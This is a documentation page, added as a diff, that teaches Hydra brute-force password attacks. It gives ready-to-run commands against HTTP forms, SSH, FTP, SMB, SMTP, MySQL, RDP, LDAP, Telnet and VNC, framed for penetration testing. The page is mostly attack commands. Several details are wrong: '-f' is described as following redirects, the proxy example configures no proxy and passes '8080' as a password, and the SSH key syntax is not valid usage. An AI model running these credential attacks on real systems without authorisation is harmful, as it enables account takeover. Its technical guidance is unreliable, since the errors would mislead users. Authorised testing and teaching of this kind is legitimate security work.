@@ -1,0 +1,197 @@
+---
+title: Protocol Guides for Hydra
+description: Detailed guides for using Hydra with various protocols including HTTP, SSH, FTP, and more
+---
+
+# Protocol Guides for Hydra
+
+This section provides detailed guidance on using Hydra with specific protocols. Each protocol has unique characteristics and requirements that affect how you conduct brute force attacks.
+
+## Common Protocols Overview
+
+Hydra supports a wide range of protocols for password attacks. Below are detailed guides for the most commonly used protocols in penetration testing.
+
+## HTTP/HTTPS
+
+HTTP-based authentication is one of the most common targets for Hydra attacks.
+
+### HTTP Basic Authentication
+
+```bash
+hydra -l admin -P wordlist.txt http-get://example.com/admin/
+```
+
+### HTTP Form-Based Authentication
+
+```bash
+hydra -l admin -P wordlist.txt http-post-form://example.com/login.php:"username=^USER^&password=^PASS^":"Login failed"
+```
+
+The syntax for HTTP form attacks requires three parameters separated by colons:
+1. The URL path
+2. The form parameters with ^USER^ and ^PASS^ placeholders
+3. The error message indicating failed login
+
+### HTTP Form with Additional Parameters
+
+```bash
+hydra -l admin -P wordlist.txt http-post-form://example.com/login.php:"username=^USER^&password=^PASS^&submit=Login":"Login failed":"H=Cookie: sessid=1234"
+```
+
+## SSH Protocol
+
+SSH is a common target in internal network penetration tests.
+
+```bash
+hydra -l user -P wordlist.txt ssh://10.0.0.1
+```
+
+### SSH with Custom Port
+
+```bash
+hydra -l user -P wordlist.txt -s 2222 ssh://10.0.0.1
+```
+
+### SSH with Private Key
+
+```bash
+hydra -L users.txt -P keys_list.txt ssh://10.0.0.1 -e n -m id_rsa
+```
+
+## FTP Protocol
+
+FTP servers are often targeted due to their widespread use.
+
+```bash
+hydra -l ftpuser -P wordlist.txt ftp://192.168.1.1
+```
+
+### FTP with Anonymous Login Check
+
+```bash
+hydra -L users.txt -P wordlist.txt ftp://192.168.1.1 -e nsr
+```
+
+The `-e nsr` option tries:
+- `n`: null password
+- `s`: same as login
+- `r`: reversed login
+
+## SMB Protocol
+
+SMB is a critical protocol in Windows environments.
+
+```bash
+hydra -l administrator -P wordlist.txt smb://192.168.1.1
+```
+
+### SMB with Domain
+
+```bash
+hydra -l administrator -P wordlist.txt smb://192.168.1.1 -m "domain:WORKGROUP"
+```
+
+## SMTP Protocol
+
+SMTP servers can be targeted to enumerate valid email accounts.
+
+```bash
+hydra -L users.txt -P wordlist.txt smtp://mail.example.com
+```
+
+### SMTP with VRFY Command
+
+```bash
+hydra -L users.txt smtp-enum://mail.example.com
+```
+
+## MySQL Protocol
+
+Database servers are high-value targets in penetration tests.
+
+```bash
+hydra -l root -P wordlist.txt mysql://192.168.1.1
+```
+
+## RDP Protocol
+
+Remote Desktop Protocol is commonly used in Windows environments.
+
+```bash
+hydra -l administrator -P wordlist.txt rdp://192.168.1.1
+```
+
+## LDAP Protocol
+
+LDAP is critical for directory services authentication.
+
+```bash
+hydra -l "cn=admin,dc=example,dc=com" -P wordlist.txt ldap://192.168.1.1
+```
+
+## Telnet Protocol
+
+Though older, Telnet is still found in legacy systems and IoT devices.
+
+```bash
+hydra -l admin -P wordlist.txt telnet://192.168.1.1
+```
+
+### Telnet with Custom Prompt
+
+```bash
+hydra -l admin -P wordlist.txt telnet://192.168.1.1 -m "Password:"
+```
+
+## VNC Protocol
+
+VNC servers often have weak authentication.
+
+```bash
+hydra -P wordlist.txt vnc://192.168.1.1
+```
+
+## Protocol-Specific Tips
+
+### HTTP Form Tips
+
+1. **Inspect the form**: Use browser developer tools to identify the exact form fields and submission method
+2. **Identify error messages**: Find unique strings that appear only on failed login attempts
+3. **Handle redirects**: Use the `-f` flag to follow redirects if necessary
+
+### SSH Tips
+
+1. **Connection limits**: Many SSH servers limit connection attempts; use `-t` to reduce parallel tasks
+2. **Key-based authentication**: For SSH key attacks, prepare a list of private keys to test
+3. **Timeout settings**: Adjust timeout with `-w` for slow connections
+
+### Database Protocol Tips
+
+1. **Default credentials**: Always try vendor default credentials first
+2. **Connection limits**: Databases often have strict connection limits; reduce parallelism
+3. **Error handling**: Different database versions may have different error messages
+
+## Advanced Protocol Handling
+
+### Using Proxies
+
+For HTTP-based protocols, you can route attacks through proxies:
+
+```bash
+hydra -l admin -P wordlist.txt http-post-form://example.com/login.php:"user=^USER^&pass=^PASS^":"Login failed" -x 3:1:1 -R -v -e ns -p 8080
+```
+
+### Protocol Timeouts
+
+Adjust timeouts for specific protocols:
+
+```bash
+hydra -l admin -P wordlist.txt -t 1 -W 5 rdp://192.168.1.1
+```
+
+## Next Steps
+
+After exploring these protocol-specific guides, you may want to check out:
+
+- [Advanced Techniques](/docs/hydra/advanced-techniques) - Learn about more sophisticated Hydra usage
+- [Performance Tuning](/docs/hydra/advanced-techniques/performance-tuning) - Optimize Hydra for better performance
